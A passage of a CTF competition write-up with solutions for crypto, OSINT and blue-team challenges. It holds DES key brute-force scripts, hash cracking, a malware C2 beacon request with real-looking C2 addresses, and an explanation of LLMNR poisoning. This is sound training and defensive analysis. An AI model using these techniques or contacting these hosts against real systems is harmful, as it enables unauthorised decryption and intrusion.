                    tokens.append(("newline", 10))
                else:
                    codepoint = ord(char)
                    if codepoint < BASE:
                        codepoint += ALTERNATIVE
                    tokens.append(("char", codepoint - BASE))

            return tokens

        def build_index_sequence(tokens):
            line_length = 0
            line_count = 0
            index_list = []

            for i, (token_type, _) in enumerate(tokens):
                idx = i % (line_length * line_count) if line_length > 0 else 0
                index_list.append(idx)

                if token_type == "newline":
                    if line_length == 0:
                        line_length = i + 1
                    line_count += 1

            return index_list

        def decrypt_tokens(tokens, index_list):
            length = len(tokens)
            plaintext_mod = []

            for i, (token_type, value) in enumerate(tokens):
                if token_type == "newline":
                    plaintext_mod.append(10)
                    continue

                key_value = KEY[index_list[i] % len(KEY)]
                shift = (length - i) % 4
                decrypted_value = (value - (key_value << shift)) % RANGE
                plaintext_mod.append(decrypted_value)

            return plaintext_mod

        def convert_to_ascii_art(plaintext_mod):
            ascii_chars = []
            for value in plaintext_mod:
                if value == 10:
                    ascii_chars.append("\n")
                else:
                    ascii_chars.append(VAL_TO_CHAR.get(value, "?"))

            return "".join(ascii_chars)

        def render_ascii_art_to_image(ascii_text, output_path, font_size=16):
            lines = ascii_text.splitlines()

            try:
                font = ImageFont.truetype("consola.ttf", font_size)
            except Exception:
                try:
                    font = ImageFont.truetype("Courier New.ttf", font_size)
                except Exception:
                    font = ImageFont.load_default()

            max_line_length = max(len(line) for line in lines) if lines else 0
            char_width = font.getbbox("A")[2]
            line_height = font.getbbox("A")[3] + 2

            image_width = max_line_length * char_width + 10
            image_height = line_height * len(lines) + 10

            img = Image.new("RGB", (image_width, image_height), "white")
            draw = ImageDraw.Draw(img)

            y_position = 5
            for line in lines:
                draw.text((5, y_position), line, fill="black", font=font)
                y_position += line_height

            img.save(output_path)
            return output_path

        def main():
            input_file = Path(r"C:\Users\zenge\Downloads\files (6)\flag.enc")
            output_file = Path(r"C:\Users\zenge\Downloads\files (6)\ascii_art.webp")

            print("Parsing the encrypted file...")
            tokens = parse_encrypted_file(input_file)

            print("Building the index sequence...")
            index_list = build_index_sequence(tokens)

            print("Decrypting...")
            plaintext_mod = decrypt_tokens(tokens, index_list)

            print("Converting to ASCII art...")
            ascii_art = convert_to_ascii_art(plaintext_mod)

            print("Rendering image...")
            result_path = render_ascii_art_to_image(ascii_art, output_file)

            print(f"Done! Image saved to: {result_path}")
            print("\nASCII art preview:")
            print(ascii_art[:500] + "..." if len(ascii_art) > 500 else ascii_art)

        if __name__ == "__main__":
            main()
        ```
![image](/images/FhCTF/33.webp)

```
FhCTF{S1mpl3_FL46_We4k_P4ss}
```

### DES Lv.1 - The Old Captain's Treasure
- Part 1: JPEG height restoration (Image Forensics)

    - Challenge analysis

        **Target file**: `treasuremap.webp`
        **Symptom**: the bottom of the image is truncated and the complete content is missing.
        **Cause**: the JPEG height value in the hex header was maliciously modified, causing the viewer to render only the top part while the hidden data remains in the file.

    - Core principle

        JPEG uses SOF (Start of Frame) segments to store image dimensions:

        **SOF marker**: `FF C0` (Baseline DCT) or `FF C2` (Progressive DCT)
        **Structure**: `[FF C0] [length(2 bytes)] [precision(1 byte)] [height(2 bytes)] [width(2 bytes)]`
        **Byte order**: Big-endian

        If the height is set too small, viewers ignore pixels beyond that height, but those bytes remain in the file. Restore or enlarge the height and the hidden content will appear.

    - Script

        A. Read and search SOF markers.

        ```python
        import re
        import struct

        with open("treasuremap.webp", "rb") as f:
            data = bytearray(f.read())

        # Search all SOF markers (FF C0 or FF C2)
        matches = [m.start() for m in re.finditer(b'\xff[\xc0\xc2]', data)]
        ```

        This step finds all headers that define image dimensions. Since JPEG may include thumbnails, there can be multiple SOF blocks.

        B. Identify the main image.

        ```python
        max_width = 0
        target_idx = -1

        for sof_pos in matches:
            h_idx = sof_pos + 5  # height position
            w_idx = sof_pos + 7  # width position

            h = struct.unpack(">H", data[h_idx:h_idx+2])[0]
            w = struct.unpack(">H", data[w_idx:w_idx+2])[0]

            if w > max_width:
                max_width = w
                target_idx = h_idx
        ```

        `>H` means big-endian unsigned short, matching JPEG format. The main image usually has the largest width.

        C. Modify the height and save.

        ```python
        new_height = 2000  # Set a large enough height
        data[target_idx:target_idx+2] = struct.pack(">H", new_height)

        with open("treasuremap_fixed.jpg", "wb") as f:
            f.write(data)
        ```

        After repair, open the image to see hidden content, including:
        - `plaintext.enc` hint
        - partial key hint: `r5K9`

        ![{6ED9B10C-BFBE-4518-B8C4-EF7B5ABA8D9F}](/images/FhCTF/34.webp)
- Part 2: DES key brute force (Cryptography)

    - Background

        **Cipher**: DES (Data Encryption Standard)
        **Input file**: `plaintext.enc` (hex-encoded ciphertext)
        **Known data**:
        - Challenge hint: "The Data" can help you decrypt faster.
        - map bottom-right red text: `key part: r5K9`

    - Mode analysis

        Check `plaintext.enc`:
        1. Hex string length is even → can convert to bytes.
        2. Resulting byte length is a multiple of 8 → matches DES block size.

        Since no IV is provided and this is an entry-level CTF challenge, the likely mode is **DES-ECB**.

        **ECB characteristics**:
        - no IV
        - each block encrypts independently
        - identical plaintext blocks produce identical ciphertext blocks

    - Key structure analysis

        DES key is 8 bytes.
        Known first 4 bytes: `r5K9`
        Unknown last 4 bytes: brute forced.

        **Charset**: letters + digits = 62 chars
        **Search space**: 62^4 = 14,776,336 possibilities

- Speedup strategy

    The hint "The Data can help you decrypt faster" means:
    - you don't need to decrypt the whole file,
    - just decrypt the first 8-byte block to verify the key,
    - use a known-plaintext approach.

- Brute force script

    ```python
    import binascii
    import itertools
    import string
    from Crypto.Cipher import DES

    with open("plaintext.enc", "rb") as f:
        ct_hex = f.read().strip()
    ct = binascii.unhexlify(ct_hex)

    prefix = b"r5K9"
    charset = (string.ascii_letters + string.digits).encode()
    ct0 = ct[:8]

    def is_printable(bs: bytes) -> bool:
        return all(32 <= b < 127 or b in (10, 13, 9) for b in bs)

    found = None
    for suf in itertools.product(charset, repeat=4):
        key = prefix + bytes(suf)
        cipher = DES.new(key, DES.MODE_ECB)
        pt0 = cipher.decrypt(ct0)

        if is_printable(pt0) and pt0.startswith(b"Here is"):
            found = key
            print(f"[+] Key found: {key.decode(errors='ignore')}")
            break

    if not found:
        print("[-] Key not found")
        exit()

    cipher = DES.new(found, DES.MODE_ECB)
    pt = cipher.decrypt(ct)

    pad = pt[-1]
    if 1 <= pad <= 8 and pt.endswith(bytes([pad]) * pad):
        pt = pt[:-pad]

    with open("plaintext.dec.txt", "wb") as f:
        f.write(pt)
    ```

    **Result:**
    ```
    [+] Key found: r5K9zXxv
    ```

    Direct decrypt version

    ```python
    from Crypto.Cipher import DES
    import binascii

    with open("plaintext.enc", "rb") as f:
        data = binascii.unhexlify(f.read().strip())

    key = b"r5K9zXxv"
    cipher = DES.new(key, DES.MODE_ECB)
    plain = cipher.decrypt(data)

    pad = plain[-1]
    if 1 <= pad <= 8 and plain.endswith(bytes([pad]) * pad):
        plain = plain[:-pad]

    with open("plaintext.dec.txt", "wb") as f:
        f.write(plain)
    ```

    Result

    The decrypted `plaintext.dec.txt` contained:

    ```
    Here is your reward for finding the right key:
    FhCTF{D0n7_c0un7_7h3_d4y5_m4k3_7h3_d4y5_c0un7}
    ```
```
FhCTF{D0n7_c0un7_7h3_d4y5_m4k3_7h3_d4y5_c0un7}
```

### DES Lv.2 – The Old Captain's Treasure Again (Write-up)

- Challenge description and clue summary

    The hints were:

    * encrypted data in `plaintext.enc`
    * last puzzle key part `r5K9zXxv`
    * map also showed `r5K9`, `A.D.1688`
    * it clearly said **"The Data." can help you decrypt faster**

    Goal: decrypt the ciphertext and find GPS coordinates or the flag.

- Initial analysis: ciphertext format and DES features

    After obtaining `plaintext.enc`, check its format:

    * the file looks like a long hex string (`0-9a-f`)
    * convert it with `bytes.fromhex(...)` to get the actual ciphertext bytes
    * DES block size is 8 bytes, so the ciphertext length should be a multiple of 8

    The code likely did:

    ```python
    with open("plaintext.enc", "rb") as f:
        ct = bytes.fromhex(f.read().decode("ascii").strip())
    ```

- Attack strategy: guess mode/IV + brute force key structure

    DES challenges often hide the problem not just in the key, but also in:

    * mode: ECB / CBC / CFB / OFB …
    * IV may be:
      * fixed all zeros,
      * derived from a hint like "The Data",
      * prefixed to the ciphertext as `IV || CIPHERTEXT`.
    * key might not be `r5K9????` but could also be `????r5K9`.

    The solution used:

    - (A) try several common schemes:

        ```python
        schemes = [
            ("CBC_IV_TheData", DES.MODE_CBC, b"The Data", ct),
            ("CBC_IV_zeros",   DES.MODE_CBC, b"\x00"*8,  ct),
            ("CBC_IV_prefix",  DES.MODE_CBC, ct[:8],     ct[8:]),
            ("ECB",            DES.MODE_ECB, None,       ct),
        ]
        ```

    - (B) try multiple key structures:

        Since `r5K9` appeared and previous key was `r5K9zXxv`, assume the key may be fixed 4 bytes + brute-force 4 bytes.

        Try both:
        * `base + suffix` → `r5K9????`
        * `suffix + base` → `????r5K9`

    - (C) limit the brute force charset:

        `a-zA-Z0-9` plus `_ - ! @ # .`
        This covers common CTF key patterns while keeping the search feasible.

    The brute force scope is roughly:

    * charset length ≈ 67
    * suffix 4 chars → `67^4 ≈ 20,151,121`

- Fast validation to avoid decrypting the full file each time

    The slow part is decrypting the entire ciphertext for each key. The trick is:

    - only decrypt the first 64 bytes as a head sample
    - check whether the head looks like valid plaintext

    Use two criteria:

    1. GPS regex match
    2. high printable character ratio

    Example regex for common coordinates:

    ```python
    gps_pat = re.compile(rb'[-+]?\d{1,3}\.\d{3,}\s*[, ]\s*[-+]?\d{1,3}\.\d{3,}')
    ```

    Printable ratio:

    ```python
    def printable_ratio(b: bytes) -> float:
        good = sum(1 for x in b if x in b"\n\r\t" or 32 <= x <= 126)
        return good / len(b)
    ```

    If `gps_pat.search(head)` hits or `printable_ratio(head) > 0.92`, decrypt the full text.

    Then search for a flag pattern:

    ```python
    flag_pat = re.compile(rb'FhCTF\{[^}]{1,100}\}', re.I)
    ```

- Running (Windows / PowerShell)

    - Install dependencies:

    ```powershell
    python -m pip install pycryptodome
    ```

    - Run:

    ```powershell
    python slove.py
    ```

- Wait for success (it may take a while)

    When a candidate key matches, the program prints:

    * the hit key and scheme
    * first 200 bytes of head
    * any GPS or flag found
    * first 500 bytes of plaintext

    Example output:

    ```
    *] brute forcing key structures...

    [+] HIT! key=b'r5K9bB2x'  scheme=CBC_IV_TheData
    [+] head: b'b4NKr3W8 Encryption Standard (DES) is a symmetric-key block ciph'
    [+] FLAG: b'FhCTF{23.257735309160896_119.66758643893687}'
    b'b4NKr3W8 Encryption Standard (DES) is a symmetric-key block cipher that operates on fixed-size blocks of data. DES processes data in 64-bit (8-byte) blocks and uses a 64-bit key, of which 56 bits are effective key material and the remaining 8 bits are used for parity checking. Because DES encrypts only one block at a time, it must be combined with a mode of operation to securely encrypt data longer than a single block.\r\n\r\nOne widely used mode is Cipher Block Chaining (CBC). In DES-CBC mode, each'
    ```
    ```
    FhCTF{23.257735309160896_119.66758643893687}
    ```

### Admin Password Onion

Three levels:

1. Level 1 gives an MD5 hash. Use online tools and get `qwerty`.
2. Level 2 gives SHA-1, but with intuition we guessed `admin`.
3. Level 3 is just Base64 decode, giving `FsCTF{Happy Day}`.

Finally the flag is:
```
FhCTF{CrYpt0_W3b_M4st3r_2025}
```


## OSINT
### Art Work
We were given an image:
![image](/images/FhCTF/35.webp)
A reverse image search found a piece called "Seed of Wind" exhibited at the 2022 Pingtung Luoshan Wind Art Festival from 111.11.04 to 112.02.05.
```
FhCTF{屏東縣_落山風藝術季_1111104-1120205}
```

### Trace the Landmark
We were given three photos.
![photo-1](/images/FhCTF/36.webp)
![photo-2](/images/FhCTF/37.webp)
![photo-3](/images/FhCTF/38.webp)
Using the third photo in a reverse image search found the building **Piazza della Rotonda**.
![image](/images/FhCTF/39.webp)
After arranging the hints properly, the result is:
```
FhCTF{Piazza_della_Rotonda_00186_Roma_RM_Italy}
```

### Island 1
We were given this image:
![land-1](/images/FhCTF/40.webp)
Even though it was pixelated, it was still recognizable as "Xin _ Miaokou Restaurant".
A Google search found the restaurant.
![image](/images/FhCTF/41.webp)
We matched the menu items with the dish in the picture.
![37077136260_d855810352_c](/images/FhCTF/42.webp)
The final answer was the dish in the center of the image: **Stir-Fried Thousand Buddha Hands**.
```
FhCTF{新大廟口活海鮮_炒千佛手}
```

### The FH Gift
The challenge started with `malware_sample.eml`. Opening it revealed:

![image](/images/FhCTF/43.webp)

The `salary_adjustment.docx` file was not actually a Word document—it was a disguised ZIP archive. By checking the magic bytes, we saw it started with `PK\x03\x04`, which is the ZIP file signature.

![image](/images/FhCTF/44.webp)

```
FhCTF{M1M3_Typ3s_C4n_B3_D3c3pt1v3}
```

### Business Time 1
The challenge provided this image:
![exhibition](/images/FhCTF/45.webp)

Put it into metadata2go.com and got this data:
![image](/images/FhCTF/46.webp)

The description field contained a website. Clicking it opened a redirect to the exhibition site.

![2026-01-03_14.35.58](/images/FhCTF/47.webp)

This led to https://github.com/tschool-students/tschool-students.github.io

We concluded it was the Taiwan Taipei Municipal Digital Experimental Senior High School Learning Sharing Conference.

![image](/images/FhCTF/48.webp)

The event dates were 2026.1.18 9:00-16:00 and 1.19 9:00-16:00. In ISO 8601 format:
`2026-01-18T09:00_2026-01-19T16:00`

```
FhCTF{T-SCHOOL_STUDENTS_EXPO'26_2026-01-18T09:00_2026-01-19T16:00}
```

### Business Time 2
From Business Time 1, we learned the venue address is `No. 110, Jilin Road, Zhongshan District, Taipei City`.

We entered the address into Google Maps and copied the coordinates.

![截圖 2026-01-05 00.25.06](/images/FhCTF/49.webp)


### Lithium exploration
![SalardeUyuni](/images/FhCTF/50.webp)

We gave the image to AI.

Country: Bolivia
Salt flat name: Salar de Uyuni
Mineral: Lithium

It was wrong at first, but after the challenge changes it became correct. Very strange.

```
FhCTF{Bolivia_SalardeUyuni_Lithium}
```

### SRL
We were given this image:
![SRL](/images/FhCTF/51.webp)
We saw the Taipei Dome on the right and the Sun Yat-sen Memorial Hall and Taipei 101 in the background, so we inferred the location.
![image](/images/FhCTF/52.webp)

### Island 2

```
During the late Qing and early Republican era, people had little knowledge of leprosy. To isolate sick patients, they sent them to Jianggong Islet to fend for themselves, so the island became known as "Leprosy Reef." After patients were isolated there, they could only look at Kinmen Island from afar and could not return home.
```

Searched this with Google AI.
![image](/images/FhCTF/53.webp)
![image](/images/FhCTF/54.webp)

### Beautiful Dome 1

```danger
Please use your intuition.
```

![image](/images/FhCTF/55.webp)

### Beautiful Dome 2

A simple search for `free ferry Turkey` led us to Turkish Airlines tour page:

https://www.turkishairlines.com/zh-tw/flights/fly-different/touristanbul/

![截圖 2026-01-05 00.40.35](/images/FhCTF/56.webp)

Google Maps showed our destination is near the Bosphorus.

We had this info: `T06 18:30-23:00` and the Bosphorus cruise runs from April 1 to October 31.

The flag format becomes:

```
FhCTF{1830-2300_0401-1031}
```

### Rider Without Helmet
![rider_without_helmet](/images/FhCTF/57.webp)

A quick reverse image search found the brand and model. Trying a few possibilities, we locked it down.
![image](/images/FhCTF/58.webp)

```
FhCTF{2014_Kymco_Many50}
```

### EXIF Photo Coordinates

This challenge's file had a small issue, but once the EXIF was fully combined, the photo's latitude and longitude could be inferred.


## Blue team
### Big Order
1. A hex-encoded string: `775a20657e725a206725250925317172587b3774750d2132747f5a2631752251`
2. A network packet hex dump, showing an HTTP POST request.

Inspecting the provided packet, we found these key details:

```
POST /api/v1/config HTTP/1.1
Host: 45.33.22.11
User-Agent: C2-Client/1.0
X-Auth-Token: FhCTF
Content-Type: application/x-binary

Target_ID: 775a20657e725a206725250925317172587b3774750d2132747f5a2631752251
```
From `X-Auth-Token: FhCTF`, we guessed that `FhCTF` is likely used as the encryption key for `Target_ID`.

- XOR decryption in Python:

```python
import binascii

hex_string = "775a20657e725a206725250925317172587b3774750d2132747f5a2631752251"
key = "FhCTF"

hex_bytes = bytes.fromhex(hex_string)
result = bytearray()
key_bytes = key.encode('ascii')

for i, byte in enumerate(hex_bytes):
    result.append(byte ^ key_bytes[i % len(key_bytes)])

print(result.decode('ascii'))
```

The decrypted MD5 hash `12c1842c3ccafe7408c23ebf292ee3d9` was submitted to VirusTotal.
![image](/images/FhCTF/59.webp)
The VirusTotal report revealed the malware C2 server:
- **C2 server**: `http://171.22.28.221/5c06c05b7b34e8e6.php`

```
FhCTF{http://171.22.28.221/5c06c05b7b34e8e6.php}
```

### 🧩 User's Bad Day
The challenge gave a packet trace and asked to identify three key details: host name, account name, and file name, then combine them into the flag format.

- Host name from DNS query

    The packet starts with a DNS query like:

    ```txt
    DNS Standard query A fulesrv.local
    ```

    That means the target host is `fulesrv.local`.
    Since the challenge says the host name excludes the domain, use only:

    - host name: `fulesrv`

    ✅ host name = `fulesrv`

- DNS failure and LLMNR

    When DNS fails, Windows falls back to LLMNR.
    The packet contains:

    ```txt
    LLMNR query A fulesrv
    ```

    This means the system is asking "who is fulesrv?"

- LLMNR poisoning

    At this stage, the attacker host (for example `192.168.50.200`) replies as if it were the target server, causing the victim to connect to the attacker.
    That is the classic **LLMNR poisoning** attack.

- Account name from NTLM authentication

    During SMB authentication, the `NTLMSSP AUTHENTICATE_MESSAGE` packet contains fields such as Domain Name, User Name, and Workstation Name.
    Decoding the UTF-16LE strings in the packet produced:

    - Domain: `DOMAIN`
    - User: `Bob`
    - Workstation: `WORKST`

    The requested account name is the user name seen in NTLM auth:

    ✅ account name = `Bob`

- File name from SMB packet strings

    Later SMB packets contained the filename path in UTF-16LE.
    For example:

    ```txt
    74 00 65 00 73 00 74 00
    ```

    Decoding that gives `test`.
    The challenge says the file name excludes extension, so even if the actual file was `test.txt` or `test.docx`, the answer is just:

    ✅ file name = `test`

Using the required format:

```
FhCTF{host_account_filename}
```

Substitute the results:

- host name: `fulesrv`
- account name: `Bob`
- file name: `test`

Final flag:

```
FhCTF{fulesrv_Bob_test}
```
